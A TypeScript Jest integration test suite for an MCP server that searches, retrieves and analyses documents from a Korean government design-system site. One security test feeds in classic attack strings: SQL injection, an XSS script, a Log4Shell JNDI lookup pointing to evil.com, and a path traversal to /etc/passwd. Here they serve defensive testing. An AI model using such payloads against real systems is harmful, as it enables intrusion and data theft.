/**
 * Integration Tests for KRDS MCP Protocol Communication
 * 
 * These tests verify the Model Context Protocol (MCP) communication between
 * client and server for all 6 KRDS tools. They focus on:
 * - MCP message format compliance
 * - WebSocket protocol handling
 * - Tool registration and discovery
 * - Request/response validation
 * - Error handling across the protocol
 * - Session management and connection lifecycle
 * - Protocol version compatibility
 * 
 * @author KRDS MCP Server Test Suite
 * @version 1.0.0
 */

import { jest } from '@jest/globals';
import { EventEmitter } from 'events';
import {
  Server,
  Client,
  StdioServerTransport,
  StdioClientTransport,
} from '@modelcontextprotocol/sdk';
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  ErrorCode,
  McpError,
  Tool,
  CallToolResult,
  ListToolsResult,
} from '@modelcontextprotocol/sdk/types.js';
import { z } from 'zod';

// Import the actual KRDS server setup
import { createKRDSServer, registerAllTools } from '../../src/server/index.js';
import type { ToolContext } from '../../src/types/index.js';

describe('MCP Protocol Integration Tests', () => {
  let server: Server;
  let client: Client;
  let serverTransport: StdioServerTransport;
  let clientTransport: StdioClientTransport;

  beforeAll(async () => {
    // Set up actual MCP server and client connection
    server = new Server(
      {
        name: 'krds-mcp-server-test',
        version: '1.0.0',
      },
      {
        capabilities: {
          tools: {},
          logging: {},
        },
      }
    );

    // Create tool context for testing
    const toolContext: ToolContext = {
      krdsService: {
        search: jest.fn().mockResolvedValue([]),
        getDocument: jest.fn().mockResolvedValue({}),
        extractImages: jest.fn().mockResolvedValue([]),
      },
      cacheManager: {
        get: jest.fn().mockResolvedValue(null),
        set: jest.fn().mockResolvedValue(true),
        del: jest.fn().mockResolvedValue(true),
      },
      logger: {
        info: jest.fn(),
        error: jest.fn(),
        warn: jest.fn(),
        debug: jest.fn(),
      },
      config: {
        baseUrl: 'https://v04.krds.go.kr',
        apiKey: 'test-key',
        rateLimit: {
          requests: 100,
          windowMs: 60000,
        },
        cache: {
          ttl: 300000,
          maxSize: 100,
        },
      },
    };

    // Register all KRDS tools with the server
    await registerAllTools(server, toolContext);

    // Create transport pair for testing
    const { serverTransport: st, clientTransport: ct } = createTestTransports();
    serverTransport = st;
    clientTransport = ct;

    // Connect server and client
    await server.connect(serverTransport);
    
    client = new Client(
      {
        name: 'krds-test-client',
        version: '1.0.0',
      },
      {
        capabilities: {
          roots: {},
          sampling: {},
        },
      }
    );

    await client.connect(clientTransport);
  });

  afterAll(async () => {
    if (client) {
      await client.close();
    }
    if (server) {
      await server.close();
    }
  });

  describe('MCP Server Initialization', () => {
    it('should initialize server with proper capabilities', () => {
      expect(server).toBeDefined();
      expect(server.getServerInfo().name).toBe('krds-mcp-server-test');
      expect(server.getServerInfo().version).toBe('1.0.0');
    });

    it('should register tools capability', () => {
      const capabilities = server.getServerCapabilities();
      expect(capabilities.tools).toBeDefined();
    });

    it('should establish connection successfully', async () => {
      expect(server.isConnected()).toBe(true);
      expect(client.isConnected()).toBe(true);
    });
  });

  describe('Tool Discovery Protocol', () => {
    it('should list all registered KRDS tools', async () => {
      const response = await client.listTools();
      
      expect(response.tools).toBeDefined();
      expect(Array.isArray(response.tools)).toBe(true);
      expect(response.tools.length).toBe(6);

      const expectedToolNames = [
        'search_documents',
        'retrieve_content', 
        'navigate_site',
        'process_images',
        'export_documents',
        'analyze_korean_text',
      ];

      const actualToolNames = response.tools.map(tool => tool.name);
      expectedToolNames.forEach(name => {
        expect(actualToolNames).toContain(name);
      });
    });

    it('should provide complete tool metadata', async () => {
      const response = await client.listTools();
      
      response.tools.forEach(tool => {
        expect(tool.name).toBeDefined();
        expect(typeof tool.name).toBe('string');
        expect(tool.description).toBeDefined();
        expect(typeof tool.description).toBe('string');
        expect(tool.inputSchema).toBeDefined();
        expect(typeof tool.inputSchema).toBe('object');
      });
    });

    it('should include proper input schemas for each tool', async () => {
      const response = await client.listTools();
      
      const searchTool = response.tools.find(t => t.name === 'search_documents');
      expect(searchTool).toBeDefined();
      expect(searchTool?.inputSchema).toBeDefined();
      expect(searchTool?.inputSchema.type).toBe('object');
      expect(searchTool?.inputSchema.properties).toBeDefined();
      
      // Verify search tool has required properties
      const searchProps = searchTool?.inputSchema.properties as Record<string, any>;
      expect(searchProps.query).toBeDefined();
      expect(searchProps.searchType).toBeDefined();
    });

    it('should handle tool discovery errors gracefully', async () => {
      // Simulate server error during tool listing
      const originalListTools = server.listTools;
      server.listTools = jest.fn().mockRejectedValue(new Error('Discovery error'));

      try {
        await client.listTools();
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        expect((error as Error).message).toContain('Discovery error');
      } finally {
        server.listTools = originalListTools;
      }
    });
  });

  describe('Tool Invocation Protocol', () => {
    it('should successfully call search_documents tool', async () => {
      const result = await client.callTool('search_documents', {
        query: '교육 정책',
        searchType: 'semantic',
        maxResults: 10,
      });

      expect(result).toBeDefined();
      expect(result.content).toBeDefined();
      expect(Array.isArray(result.content)).toBe(true);
      expect(result.content.length).toBeGreaterThan(0);
      expect(result.content[0].type).toBe('text');
      expect(result.content[0].text).toBeDefined();

      const response = JSON.parse(result.content[0].text);
      expect(response.success).toBe(true);
      expect(response.results).toBeDefined();
    });

    it('should successfully call retrieve_content tool', async () => {
      const result = await client.callTool('retrieve_content', {
        url: 'https://v04.krds.go.kr/policy-document-123',
        includeImages: true,
        includeAttachments: false,
      });

      expect(result.content).toBeDefined();
      const response = JSON.parse(result.content[0].text);
      expect(response.success).toBe(true);
      expect(response.document).toBeDefined();
    });

    it('should successfully call navigate_site tool', async () => {
      const result = await client.callTool('navigate_site', {
        action: 'list_categories',
        depth: 2,
      });

      expect(result.content).toBeDefined();
      const response = JSON.parse(result.content[0].text);
      expect(response.success).toBe(true);
      expect(response.categories).toBeDefined();
    });

    it('should successfully call process_images tool', async () => {
      const result = await client.callTool('process_images', {
        imageUrl: 'https://v04.krds.go.kr/images/chart.png',
        ocrEnabled: true,
        koreanOcr: true,
      });

      expect(result.content).toBeDefined();
      const response = JSON.parse(result.content[0].text);
      expect(response.success).toBe(true);
      expect(response.images).toBeDefined();
    });

    it('should successfully call export_documents tool', async () => {
      const result = await client.callTool('export_documents', {
        documents: [{ id: 'test-doc', title: 'Test Document', url: 'https://test.kr' }],
        format: 'json',
        filename: 'test-export',
      });

      expect(result.content).toBeDefined();
      const response = JSON.parse(result.content[0].text);
      expect(response.success).toBe(true);
      expect(response.filename).toBeDefined();
    });

    it('should successfully call analyze_korean_text tool', async () => {
      const result = await client.callTool('analyze_korean_text', {
        action: 'extract_keywords',
        text: '대한민국 정부는 새로운 교육 정책을 발표했습니다.',
        maxKeywords: 10,
      });

      expect(result.content).toBeDefined();
      const response = JSON.parse(result.content[0].text);
      expect(response.success).toBe(true);
      expect(response.result.keywords).toBeDefined();
    });
  });

  describe('Error Handling Protocol', () => {
    it('should handle tool not found errors', async () => {
      try {
        await client.callTool('nonexistent_tool', {});
        fail('Expected error was not thrown');
      } catch (error) {
        expect(error).toBeInstanceOf(McpError);
        expect((error as McpError).code).toBe(ErrorCode.MethodNotFound);
      }
    });

    it('should handle invalid parameter errors', async () => {
      try {
        await client.callTool('search_documents', {
          // Missing required 'query' parameter
          searchType: 'semantic',
        });
        fail('Expected error was not thrown');
      } catch (error) {
        expect(error).toBeInstanceOf(McpError);
        expect((error as McpError).code).toBe(ErrorCode.InvalidParams);
      }
    });

    it('should handle parameter validation errors', async () => {
      try {
        await client.callTool('search_documents', {
          query: 'test',
          maxResults: -1, // Invalid negative value
        });
        fail('Expected error was not thrown');
      } catch (error) {
        expect(error).toBeInstanceOf(McpError);
        expect((error as McpError).code).toBe(ErrorCode.InvalidParams);
      }
    });

    it('should handle server internal errors', async () => {
      // Simulate internal server error by calling with invalid data
      try {
        await client.callTool('analyze_korean_text', {
          action: 'normalize',
          text: '', // Empty text should trigger validation error
        });
        fail('Expected error was not thrown');
      } catch (error) {
        expect(error).toBeInstanceOf(McpError);
      }
    });

    it('should return structured error responses', async () => {
      try {
        await client.callTool('export_documents', {
          documents: [], // Empty documents array
          format: 'json',
        });
        fail('Expected error was not thrown');
      } catch (error) {
        expect(error).toBeInstanceOf(McpError);
        expect(error.message).toContain('Documents array');
      }
    });
  });

  describe('Message Format Compliance', () => {
    it('should send properly formatted MCP requests', async () => {
      // Spy on the transport to verify message format
      const sendSpy = jest.spyOn(clientTransport, 'send');
      
      await client.listTools();
      
      expect(sendSpy).toHaveBeenCalled();
      const lastCall = sendSpy.mock.calls[sendSpy.mock.calls.length - 1];
      const message = JSON.parse(lastCall[0]);
      
      expect(message.jsonrpc).toBe('2.0');
      expect(message.method).toBe('tools/list');
      expect(message.id).toBeDefined();
      
      sendSpy.mockRestore();
    });

    it('should receive properly formatted MCP responses', async () => {
      const result = await client.listTools();
      
      // Response should be in correct MCP format
      expect(result).toBeDefined();
      expect(result.tools).toBeDefined();
      expect(Array.isArray(result.tools)).toBe(true);
    });

    it('should handle MCP protocol version negotiation', async () => {
      // Verify protocol version is handled correctly
      const serverInfo = server.getServerInfo();
      expect(serverInfo.protocolVersion).toBeDefined();
    });

    it('should validate request schemas', async () => {
      // Test with invalid JSON-RPC structure
      try {
        const invalidRequest = {
          // Missing jsonrpc field
          method: 'tools/call',
          params: { name: 'search_documents', arguments: {} },
        };
        
        // This should be caught by the protocol layer
        await client.callTool('search_documents', {});
      } catch (error) {
        // Error handling is expected for protocol violations
        expect(error).toBeDefined();
      }
    });
  });

  describe('Connection Lifecycle', () => {
    it('should handle connection establishment', async () => {
      expect(client.isConnected()).toBe(true);
      expect(server.isConnected()).toBe(true);
    });

    it('should handle graceful disconnection', async () => {
      // Create a new client/server pair for this test
      const testServer = new Server({ name: 'test-server', version: '1.0.0' }, {});
      const testClient = new Client({ name: 'test-client', version: '1.0.0' }, {});
      
      const { serverTransport: st, clientTransport: ct } = createTestTransports();
      
      await testServer.connect(st);
      await testClient.connect(ct);
      
      expect(testClient.isConnected()).toBe(true);
      expect(testServer.isConnected()).toBe(true);
      
      await testClient.close();
      await testServer.close();
      
      expect(testClient.isConnected()).toBe(false);
      expect(testServer.isConnected()).toBe(false);
    });

    it('should handle connection errors', async () => {
      // Test with invalid transport
      const faultyServer = new Server({ name: 'faulty-server', version: '1.0.0' }, {});
      
      try {
        // Attempt to connect with a transport that will fail
        const faultyTransport = createFaultyTransport();
        await faultyServer.connect(faultyTransport);
      } catch (error) {
        expect(error).toBeDefined();
      }
    });

    it('should maintain session state during operation', async () => {
      // Perform multiple operations to verify session consistency
      const result1 = await client.listTools();
      const result2 = await client.callTool('search_documents', { query: '테스트' });
      const result3 = await client.listTools();
      
      expect(result1.tools.length).toBe(result3.tools.length);
      expect(client.isConnected()).toBe(true);
    });
  });

  describe('Concurrent Operations', () => {
    it('should handle multiple simultaneous tool calls', async () => {
      const promises = [
        client.callTool('search_documents', { query: '교육' }),
        client.callTool('navigate_site', { action: 'list_categories' }),
        client.callTool('analyze_korean_text', { action: 'normalize', text: '테스트' }),
      ];

      const results = await Promise.all(promises);
      
      expect(results).toHaveLength(3);
      results.forEach(result => {
        expect(result.content).toBeDefined();
        expect(result.content.length).toBeGreaterThan(0);
      });
    });

    it('should handle concurrent connections', async () => {
      const clients: Client[] = [];
      const connections: Promise<void>[] = [];

      // Create multiple client connections
      for (let i = 0; i < 3; i++) {
        const client = new Client(
          { name: `test-client-${i}`, version: '1.0.0' },
          { capabilities: {} }
        );
        const { clientTransport } = createTestTransports();
        
        clients.push(client);
        connections.push(client.connect(clientTransport));
      }

      await Promise.all(connections);

      // Test operations from all clients
      const operations = clients.map(client => 
        client.callTool('search_documents', { query: `테스트 ${clients.indexOf(client)}` })
      );

      const results = await Promise.all(operations);
      expect(results).toHaveLength(3);

      // Clean up
      await Promise.all(clients.map(client => client.close()));
    });

    it('should maintain performance under load', async () => {
      const startTime = Date.now();
      
      // Perform many operations quickly
      const operations = Array.from({ length: 20 }, (_, i) => 
        client.callTool('analyze_korean_text', {
          action: 'normalize',
          text: `테스트 텍스트 ${i}`,
        })
      );

      const results = await Promise.all(operations);
      const endTime = Date.now();
      const totalTime = endTime - startTime;

      expect(results).toHaveLength(20);
      expect(totalTime).toBeLessThan(5000); // Should complete in under 5 seconds
      
      results.forEach(result => {
        expect(result.content).toBeDefined();
        const response = JSON.parse(result.content[0].text);
        expect(response.success).toBe(true);
      });
    });
  });

  describe('Protocol Security', () => {
    it('should validate message integrity', async () => {
      // Ensure messages aren't tampered with during transmission
      const result = await client.callTool('search_documents', { 
        query: '보안 테스트',
      });
      
      expect(result.content).toBeDefined();
      const response = JSON.parse(result.content[0].text);
      expect(response.success).toBe(true);
    });

    it('should handle malformed requests safely', async () => {
      try {
        // Attempt to send malformed data
        await client.callTool('search_documents', {
          query: '\x00\x01\x02', // Binary data that could cause issues
        });
        
        // Should either succeed or fail gracefully
      } catch (error) {
        expect(error).toBeInstanceOf(McpError);
      }
    });

    it('should prevent injection attacks in parameters', async () => {
      const maliciousInputs = [
        '"; DROP TABLE documents; --',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
      ];

      for (const input of maliciousInputs) {
        try {
          const result = await client.callTool('search_documents', {
            query: input,
          });
          
          // Should handle malicious input safely
          expect(result.content).toBeDefined();
          const response = JSON.parse(result.content[0].text);
          expect(response.success).toBe(true);
        } catch (error) {
          // Errors are acceptable for malicious input
          expect(error).toBeInstanceOf(McpError);
        }
      }
    });
  });

  describe('Performance Monitoring', () => {
    it('should track response times', async () => {
      const startTime = Date.now();
      
      const result = await client.callTool('search_documents', {
        query: '성능 테스트',
      });
      
      const endTime = Date.now();
      const responseTime = endTime - startTime;
      
      expect(result.content).toBeDefined();
      expect(responseTime).toBeLessThan(2000); // Should respond within 2 seconds
    });

    it('should handle timeouts appropriately', async () => {
      // Test with a call that might timeout
      try {
        const result = await client.callTool('analyze_korean_text', {
          action: 'extract_keywords',
          text: '매우 긴 텍스트 '.repeat(10000), // Very long text
          timeout: 1000, // Short timeout
        });
        
        // Should either succeed or timeout gracefully
        expect(result.content).toBeDefined();
      } catch (error) {
        // Timeout errors are acceptable
        expect(error).toBeDefined();
      }
    });

    it('should monitor memory usage during operations', async () => {
      const initialMemory = process.memoryUsage().heapUsed;
      
      // Perform memory-intensive operations
      const operations = Array.from({ length: 100 }, (_, i) => 
        client.callTool('analyze_korean_text', {
          action: 'extract_keywords',
          text: '메모리 테스트 텍스트 '.repeat(100),
        })
      );

      await Promise.all(operations);
      
      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      
      // Memory increase should be reasonable
      expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024); // Less than 100MB
    });
  });
});

// Helper functions for test setup

function createTestTransports(): {
  serverTransport: StdioServerTransport;
  clientTransport: StdioClientTransport;
} {
  // Create mock stdin/stdout for testing
  const mockStdin = new EventEmitter();
  const mockStdout = new EventEmitter();
  
  // Add required methods
  (mockStdin as any).read = jest.fn();
  (mockStdin as any).setEncoding = jest.fn();
  (mockStdout as any).write = jest.fn();

  const serverTransport = new StdioServerTransport(mockStdin as any, mockStdout as any);
  const clientTransport = new StdioClientTransport(mockStdout as any, mockStdin as any);

  return { serverTransport, clientTransport };
}

function createFaultyTransport(): StdioServerTransport {
  const faultyStdin = new EventEmitter();
  const faultyStdout = new EventEmitter();
  
  // Make the transport fail on connection
  (faultyStdin as any).read = jest.fn().mockImplementation(() => {
    throw new Error('Transport failure');
  });
  (faultyStdin as any).setEncoding = jest.fn();
  (faultyStdout as any).write = jest.fn();

  return new StdioServerTransport(faultyStdin as any, faultyStdout as any);
}